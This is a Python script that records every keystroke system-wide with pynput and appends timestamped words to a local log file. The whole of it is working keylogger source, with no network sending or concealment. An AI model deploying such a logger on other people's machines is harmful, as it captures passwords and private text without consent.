import queue
import threading
import time
from datetime import datetime
from pynput import keyboard

LOG_FILE = "test.log"
key_queue = queue.Queue()

FLUSH_TRIGGERS = {' ', '\n', '\t', '.', ',', '!', '?'}
TIME_WINDOW = 2.0  # seconds — flush if no boundary within this
KEY_ACTIONS = {
    'space':     ' ',
    'enter':     '\n',
    'tab':       '\t',
    'backspace': None,
    'shift':     '',
    'shift_r':   '',
    'ctrl':      '',
    'ctrl_r':    '',
    'alt':       '',
    'alt_l':     '',
    'alt_r':     '',
    'caps_lock': '',
    'up':        '',
    'down':      '',
    'left':      '',
    'right':     '',
    'home':      '',
    'end':       '',
}

def on_press(key):
    try:
        key_queue.put(('CHAR', key.char, time.time()))
    except AttributeError:
        # extract just the key name e.g. 'shift' from 'Key.shift'
        key_name = str(key).replace('Key.', '')
        action = KEY_ACTIONS.get(key_name, None)
        if action is not None and action != '':
            key_queue.put(('CHAR', action, time.time()))


def writer(q):
    buffer = []
    last_received = time.time()

    with open(LOG_FILE, "a", encoding='utf-8') as f:
        while True:
            try:
                kind, value, ts = q.get(timeout=0.1)  # check frequently
                buffer.append(value)
                last_received = ts

            except queue.Empty:
                idle = time.time() - last_received
                if buffer and idle >= TIME_WINDOW:  # now last_received is used
                    word = ''.join(buffer).strip()
                    timestamp = datetime.now().strftime("%H:%M:%S.%f")
                    f.write(f"[{timestamp}] {word} [timeout]\n")
                    f.flush()
                    buffer.clear()


def main():
    t = threading.Thread(target=writer, args=(key_queue,), daemon=True)
    t.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    key_queue.put(('CHAR', None, time.time()))
    t.join()


if __name__ == "__main__":
    main()